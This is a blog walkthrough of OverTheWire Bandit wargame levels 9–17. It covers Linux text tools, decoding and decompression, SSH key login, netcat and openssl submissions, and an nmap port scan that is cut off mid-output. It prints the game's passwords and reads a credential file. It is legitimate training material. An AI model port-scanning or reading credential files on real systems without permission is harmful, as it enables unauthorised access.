<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit7@bandit:~$ grep millionth data.txt 
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</code></pre></div><p>Easy. Another way that teaches you a few other concepts is doing it like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</code></pre></div><p>What we are doing here is called pipelining commands. What it does is using the output of the first command as the input of the second one, so <strong>grep</strong> will use the standard input (which will be the output produced by <strong>cat</strong>) to search the term <code>millionth</code>.</p>
<p>Onto the next level.</p>
<h2 id="level-9">Level 9</h2>
<p>Now the password is still stored in <code>data.txt</code> but now they say is the only line that is unique.
We will <strong>cat</strong> the file just to see its content</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit8@bandit:~$ cat data.txt 
KerqNiDbY0zV2VxnOCmWX5XWxumldlAe
MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET
<span style="color:#f92672">(</span>...more...<span style="color:#f92672">)</span>
YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
DXI6y5CNPU06rVpkoZgnZJBWfkdW131j
</code></pre></div><p>So once again we won&rsquo;t be able to get the unique line without using a few tools.
There is a suggested command named <code>uniq</code>, sounds like what we need by checking the <strong>man</strong> page.
So the way to use the command is by passing the flag <code>-u</code> that tells <code>uniq</code> to only print unique lines.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit8@bandit:~$ uniq -u data.txt                    
KerqNiDbY0zV2VxnOCmWX5XWxumldlAe
MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET
<span style="color:#f92672">(</span>...more...<span style="color:#f92672">)</span>
YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
DXI6y5CNPU06rVpkoZgnZJBWfkdW131j
</code></pre></div><p>Wait&hellip; It gave us the same. Let&rsquo;s check the <strong>man</strong> page again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       uniq - report or omit repeated lines

SYNOPSIS
       uniq <span style="color:#f92672">[</span>OPTION<span style="color:#f92672">]</span>... <span style="color:#f92672">[</span>INPUT <span style="color:#f92672">[</span>OUTPUT<span style="color:#f92672">]]</span>

DESCRIPTION
       Filter adjacent matching lines from INPUT <span style="color:#f92672">(</span>or standard input<span style="color:#f92672">)</span>, writing to OUTPUT <span style="color:#f92672">(</span>or standard output<span style="color:#f92672">)</span>.
</code></pre></div><p>Ok then. So it only filters <strong>adjacent matching lines</strong>. So what we could do is sort the lines so that all the repeated lines be adjacent to one another. Guess what, one of the suggested commands is <strong>sort</strong>, that should do it. We look a bit into the <strong>man</strong> page to see how it works and is nothing special, <strong>sort</strong> followed by the file name. Now <strong>sort</strong> writes to the standard output so what we can do is pipelining, check <a href="#level-8">Level 8</a> for more information on this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit8@bandit:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
</code></pre></div><p>Ok there we go. We have the password, let&rsquo;s go to the next level.</p>
<h2 id="level-10">Level 10</h2>
<p>Now the password is stored in the file <code>data.txt</code> and is one of the few human-readable strings, beginning with several <code>=</code> characters. Now we already know what a few of the suggested commands do, so we know they&rsquo;re not quite what we want. Let&rsquo;s check out <strong>strings</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       strings - print the strings of printable characters in files.
</code></pre></div><p>Ok. We can try combining <strong>strings</strong> with <strong>grep</strong> in order to get only the strings that have a <code>=</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit9@bandit:~$ strings data.txt | grep <span style="color:#f92672">=</span>
2<span style="color:#f92672">==========</span> the
<span style="color:#f92672">==========</span> password
&gt;t<span style="color:#f92672">=</span>     yP
rV~dHm<span style="color:#f92672">=</span>
<span style="color:#f92672">==========</span> isa
<span style="color:#f92672">=</span>FQ?P<span style="color:#ae81ff">\U</span>
<span style="color:#f92672">=</span>       F<span style="color:#f92672">[</span>
pb<span style="color:#f92672">=</span>x
J;m<span style="color:#f92672">=</span>
<span style="color:#f92672">=)</span>$<span style="color:#f92672">=</span>
<span style="color:#f92672">==========</span> truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
iv8!<span style="color:#f92672">=</span>
</code></pre></div><p>Ok we can assume the password is the penultimate line, minus the <code>=</code>s of course.</p>
<h2 id="level-11">Level 11</h2>
<p>Now the password is still stored in <code>data.txt</code> but encoded with base64. There is a suggested command named <code>base64</code> that might be useful.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       base64 - base64 encode/decode data and print to standard output
</code></pre></div><p>Ok, it can decode base64 so that should do it. To decode we use the <code>-d</code> flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit10@bandit:~$ base64 -d data.txt 
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
</code></pre></div><p><em>DJ Khaled Voice:</em> Another one</p>
<h2 id="level-12">Level 12</h2>
<p>The password is stored in the file <code>data.txt</code>, but all lowercase and uppercase letters have been rotated 13 positions. This is called ROT13 (you can google it to get some more information on this). It&rsquo;s a ceasar&rsquo;s cipher with the <strong>n</strong> equal to 13 (you can google this as well). So by checking out the suggested commands there are a few that we already know that are not suitable for this. One of the new ones is <strong>tr</strong>. Let&rsquo;s check the <strong>man</strong> page.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       tr - translate or delete characters
</code></pre></div><p>Ok. So it translates characters. I guess that&rsquo;s what we kind of want. We want to translate &lsquo;a&rsquo; to 13 positions ahead. So a quick google of <code>tr ROT13</code> would land us on the <a href="https://en.wikipedia.org/wiki/ROT13">Wikipedia page</a>. In the page there is an implementation of ROT13 using <strong>tr</strong>. We can kind of reverse engineer it and get what we want. This is the way to encode <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>, so to decode it should be the other way around right? <code>tr 'N-ZA-Mn-za-m' 'A-Za-z'</code></p>
<p>Well let&rsquo;s try it. <strong>tr</strong> uses the standard input, so we will pipeline it using <strong>cat</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit11@bandit:~$ cat data.txt | tr <span style="color:#e6db74">&#39;N-ZA-Mn-za-m&#39;</span> <span style="color:#e6db74">&#39;A-Za-z&#39;</span>
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
</code></pre></div><p>Perfect. Next level.</p>
<h2 id="level-13">Level 13</h2>
<p>Let&rsquo;s see the challenge description,</p>
<blockquote>
<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>
</blockquote>
<p>Ok understood. Let&rsquo;s follow the useful tips.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:~$ mkdir /tmp/dirforfiles
</code></pre></div><p>Now we have a directory to work with our files. Let&rsquo;s copy our file in there first</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:~$ cp data.txt /tmp/dirforfiles
</code></pre></div><p>Done. Let&rsquo;s change our current directory to the one we created.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:~$ cd /tmp/dirforfiles
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre></div><p>So they said that the file was a hexdump let&rsquo;s check <strong>xxd</strong>&rsquo;s <strong>man</strong> page.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       xxd - make a hexdump or <span style="color:#66d9ef">do</span> the reverse.
</code></pre></div><p>Ok what we want is to reverse it back to it&rsquo;s original state. We use the <code>-r</code> flag to do this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt 
�▒▒h��6��@4▒bi���h▒91AY&amp;SY���������ϟ���������������׽��9��
    �mF�h�h44
▒��B��,0��   ��4@�����@2▒C@h�� �
�ɋ�^-K�����<span style="color:#f92672">}</span>�<span style="color:#ae81ff">\,</span>�▒ǿ�<span style="color:#f92672">}</span>E�F�_!r�U�g?E�i��9x��TB@�lȲ���BF.hM�SC4�V�F��R�Br<span style="color:#e6db74">&#34;�&lt;(Hت</span>$<span style="color:#e6db74">    </span>$<span style="color:#e6db74">���KBs��%l▒~�_�▒ݿ����g�zM�w�#P&#34;</span>2@������

��<span style="color:#ae81ff">\�</span>�WQO4�p�i�����S�#&amp;��/�#��<span style="color:#f92672">[</span>j▒�&lt;D�uԐ^_�H.�-��wAt
                                                  �<span style="color:#f92672">[</span>��UP�G�CP��&amp;:�2�*�<span style="color:#f92672">)</span>�<span style="color:#ae81ff">\�</span>������H�
�<span style="color:#ae81ff">\�</span>7��w&lt;bandit12@bandit:/tmp/dirforfiles$
</code></pre></div><p>Ok. I think i broke it&hellip; So what happened was that <strong>xxd</strong> reversed it back to a binary but wrote the result to the standard output. Let&rsquo;s redirect it to a file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt &gt; original
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre></div><p>Ok. It worked. Let&rsquo;s check what we are dealing with by using the <strong>file</strong> command to check some more information on the file we just created.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: gzip compressed data, was <span style="color:#e6db74">&#34;data2.bin&#34;</span>, last modified: Tue Oct <span style="color:#ae81ff">16</span> 12:00:23 2018, max compression, from Unix
</code></pre></div><p>So it&rsquo;s a gzip file, let&rsquo;s learn how to decompress it by checking <strong>man gzip</strong>. So there is a flag <code>-d</code> that is used to decompress, let&rsquo;s do it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original
gzip: original: unknown suffix -- ignored
</code></pre></div><p>Hmmm&hellip; Weird. The suffix is what goes at the end of the filename i guess&hellip; OH RIGHT the file extension. This file has no extension and <strong>gzip</strong> doesn&rsquo;t like it. Let&rsquo;s give it a proper name.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ mv original original.gz
</code></pre></div><p>Ok now let&rsquo;s try it again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz 
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre></div><p>Ok no error. It worked i assume. Now we can list the dir to see what we have.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total <span style="color:#ae81ff">1896</span>
drwxr-sr-x     <span style="color:#ae81ff">2</span> bandit12 root    <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span> 16:12 .
drwxrws-wt <span style="color:#ae81ff">54536</span> root     root <span style="color:#ae81ff">1925120</span> Jun <span style="color:#ae81ff">29</span> 16:14 ..
-rw-r-----     <span style="color:#ae81ff">1</span> bandit12 root    <span style="color:#ae81ff">2581</span> Jun <span style="color:#ae81ff">29</span> 16:04 data.txt
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root     <span style="color:#ae81ff">572</span> Jun <span style="color:#ae81ff">29</span> 16:09 original
</code></pre></div><p>Ok so the file named <code>original</code> is the result of the decompression. Let&rsquo;s analyze it again with the <strong>file</strong> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: bzip2 compressed data, block size <span style="color:#f92672">=</span> 900k
</code></pre></div><p>So now it&rsquo;s compressed with <strong>bzip2</strong>. TO THE <strong>MAN</strong> PAGE!</p>
<p>Once again the <code>-d</code> flag does it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ bzip2 -d original
bzip2: Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t guess original name <span style="color:#66d9ef">for</span> original -- using original.out
</code></pre></div><p>Hm&hellip; I guess it worked. <strong>bzip2</strong> isn&rsquo;t as picky as <strong>gzip</strong> with the whole file extension thing. It just warned us that it couldn&rsquo;t guess the original name so it just used that one. That&rsquo;s ok for us. Let&rsquo;s use <strong>file</strong> again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file original.out
original.out: gzip compressed data, was <span style="color:#e6db74">&#34;data4.bin&#34;</span>, last modified: Tue Oct <span style="color:#ae81ff">16</span> 12:00:23 2018, max compression, from Unix
</code></pre></div><p>Ohhh back to gzip. I know this one. We have to change the file extension before decompressing it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ mv original.out original.gz
</code></pre></div><p>Now decompress it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz 
bandit12@bandit:/tmp/dirforfiles$ ls -la
total <span style="color:#ae81ff">1912</span>
drwxr-sr-x     <span style="color:#ae81ff">2</span> bandit12 root    <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span> 16:21 .
drwxrws-wt <span style="color:#ae81ff">54538</span> root     root <span style="color:#ae81ff">1925120</span> Jun <span style="color:#ae81ff">29</span> 16:21 ..
-rw-r-----     <span style="color:#ae81ff">1</span> bandit12 root    <span style="color:#ae81ff">2581</span> Jun <span style="color:#ae81ff">29</span> 16:04 data.txt
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">20480</span> Jun <span style="color:#ae81ff">29</span> 16:09 original
</code></pre></div><p>I&rsquo;d say it worked. Let&rsquo;s <strong>file</strong> it again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: POSIX tar archive <span style="color:#f92672">(</span>GNU<span style="color:#f92672">)</span>
</code></pre></div><p>Ohhhh that&rsquo;s a new one. Let&rsquo;s check the <strong>man tar</strong> page. To be honest i never know how to use <strong>tar</strong> and <strong>tar</strong> is really powerful (a smart way to say that it has way too many flags and information to read the man page), so let&rsquo;s ask google. I came across <a href="https://www.cyberciti.biz/faq/tar-extract-linux/">this</a>, it&rsquo;s way easier than the <strong>man</strong> page (be smart).</p>
<p>Let&rsquo;s decompress it then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf original
data5.bin
</code></pre></div><p>That must mean it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total <span style="color:#ae81ff">1924</span>
drwxr-sr-x     <span style="color:#ae81ff">2</span> bandit12 root    <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span> 16:26 .
drwxrws-wt <span style="color:#ae81ff">54542</span> root     root <span style="color:#ae81ff">1925120</span> Jun <span style="color:#ae81ff">29</span> 16:26 ..
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">10240</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> data5.bin
-rw-r-----     <span style="color:#ae81ff">1</span> bandit12 root    <span style="color:#ae81ff">2581</span> Jun <span style="color:#ae81ff">29</span> 16:04 data.txt
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">20480</span> Jun <span style="color:#ae81ff">29</span> 16:09 original
</code></pre></div><p>Ok now we have a data5.bin file. Let&rsquo;s <strong>file</strong> it. This is starting to get BORING, but we must persist.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file data5.bin 
data5.bin: POSIX tar archive <span style="color:#f92672">(</span>GNU<span style="color:#f92672">)</span>
</code></pre></div><p>We got <strong>tar</strong> again. Decompress it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf data5.bin
data6.bin
</code></pre></div><p>By now you should know the steps&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file data6.bin 
data6.bin: bzip2 compressed data, block size <span style="color:#f92672">=</span> 900k
</code></pre></div><p>Good old <strong>bzip2</strong>. Don&rsquo;t stop now, it will be over soon&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ bzip2 -d data6.bin
bzip2: Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t guess original name <span style="color:#66d9ef">for</span> data6.bin -- using data6.bin.out
</code></pre></div><p>The names are starting to get kind of awful, if you want you can change it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file data6.bin.out 
data6.bin.out: POSIX tar archive <span style="color:#f92672">(</span>GNU<span style="color:#f92672">)</span>
</code></pre></div><p>We got <strong>tar</strong> again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf data6.bin.out
data8.bin
</code></pre></div><p><strong>file</strong> it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file data8.bin 
data8.bin: gzip compressed data, was <span style="color:#e6db74">&#34;data9.bin&#34;</span>, last modified: Tue Oct <span style="color:#ae81ff">16</span> 12:00:23 2018, max compression, from Unix
</code></pre></div><p>OH MY GOD!! JUST MAKE IT STOP!!! Oh and don&rsquo;t forget <strong>gzip</strong> is the tricky one with the file extension (you&rsquo;re welcome).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ mv data8.bin data8.gz
bandit12@bandit:/tmp/dirforfiles$ gzip -d data8.gz 
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre></div><p>It worked. Let&rsquo;s see what we have in the folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total <span style="color:#ae81ff">1940</span>
drwxr-sr-x     <span style="color:#ae81ff">2</span> bandit12 root    <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span> 16:33 .
drwxrws-wt <span style="color:#ae81ff">54547</span> root     root <span style="color:#ae81ff">1925120</span> Jun <span style="color:#ae81ff">29</span> 16:34 ..
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">10240</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> data5.bin
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">10240</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> data6.bin.out
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root      <span style="color:#ae81ff">49</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> data8
-rw-r-----     <span style="color:#ae81ff">1</span> bandit12 root    <span style="color:#ae81ff">2581</span> Jun <span style="color:#ae81ff">29</span> 16:04 data.txt
-rw-r--r--     <span style="color:#ae81ff">1</span> bandit12 root   <span style="color:#ae81ff">20480</span> Jun <span style="color:#ae81ff">29</span> 16:09 original
</code></pre></div><p>If you&rsquo;re not sure what is what by now i can&rsquo;t blame you, but we know that the ones with <code>.bin</code> and <code>.bin.out</code> are intermediate files. The one we want is <code>data8</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ file data8
data8: ASCII text
</code></pre></div><p>Finally! This is probably the original file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit12@bandit:/tmp/dirforfiles$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
</code></pre></div><p>It&rsquo;s over. I need a break&hellip;</p>
<h2 id="level-14">Level 14</h2>
<p>So new level, new challenge. The password is stored in a file but can only be read by the <strong>bandit14</strong> (we are <strong>bandit13</strong>). They give us a SSH key to login to next level though. If whe check the <strong>man</strong> page we learn that we can use the <code>-i</code> flag to use a private key to login. Let&rsquo;s try it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
<span style="color:#f92672">(</span>...connection established text...<span style="color:#f92672">)</span>
bandit14@bandit:~$ 
</code></pre></div><p>Ok we got a prompt as <strong>bandit14</strong>. Have in mind that you&rsquo;re 2 levels deep in ssh connections. Now we can <strong>cat</strong> the password file mentioned previously.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
</code></pre></div><p>Onto the next one.</p>
<h2 id="level-15">Level 15</h2>
<p>We can get the password for the next user if we submit the current one to port <strong>30000</strong>. We can use <strong>nc</strong> (netcat) to make simple TCP and UDP connections let&rsquo;s try it. <strong>nc</strong> takes a <strong>host</strong> and a <strong>port</strong> to connect to. Let&rsquo;s try it then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit14@bandit:~$ nc localhost <span style="color:#ae81ff">30000</span>
</code></pre></div><p>Ok now we can write the password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit14@bandit:~$ nc localhost <span style="color:#ae81ff">30000</span>
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
</code></pre></div><p>Next please.</p>
<h2 id="level-16">Level 16</h2>
<p>This challenge has a few important notes so i&rsquo;ll just paste it here</p>
<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to port <strong>30001</strong> on localhost using <strong>SSL encryption</strong>.</p>
</blockquote>
<blockquote>
<p>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</p>
</blockquote>
<p>So we have a suggested command named openssl and our port is using ssl encryption. Let&rsquo;s check the <strong>man</strong> page.</p>
<p>In the <strong>man</strong> page there is a field named <strong>s_client</strong> which says that implements a generic SSL/TLS client. That should do it. Let&rsquo;s check the <strong>man s_client</strong> page. Ok we can use the <code>-connect</code> flag to insert the address and the port. Let&rsquo;s do it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit15@bandit:~$ openssl s_client -connect localhost:30001
<span style="color:#f92672">(</span>...bunch of information...<span style="color:#f92672">)</span>

</code></pre></div><p>Now we can type our current password to get the new one.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit15@bandit:~$ openssl s_client -connect localhost:30001
<span style="color:#f92672">(</span>...bunch of information...<span style="color:#f92672">)</span>
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed
</code></pre></div><p>Ok we got it. Next one.</p>
<h2 id="level-17">Level 17</h2>
<p>Now they give us a range of ports to which we have to submit the current password. Let&rsquo;s not bruteforce it. We can use <strong>nmap</strong> to give us some information on the ports. Check the <strong>man</strong> page. We can use the <code>-p</code> flag to scan port ranges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit16@bandit:~$ nmap localhost -p31000-32000

Starting Nmap 7.40 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-06-29 17:49 CEST
Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.00021s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> closed ports
PORT      STATE SERVICE
31518/tcp open  unknown
31790/tcp open  unknown

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.08 seconds
</code></pre></div><p>So we have 2 ports open. Now we can do a service scan in both ports and see the results. To do a service scan we use the <code>-sV</code> flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit16@bandit:~$ nmap localhost -p T:31518,31790 -sV

Starting Nmap 7.40 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-06-29 17:52 CEST
Stats: 0:01:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 17:54 <span style="color:#f92672">(</span>0:01:18 remaining<span style="color:#f92672">)</span>
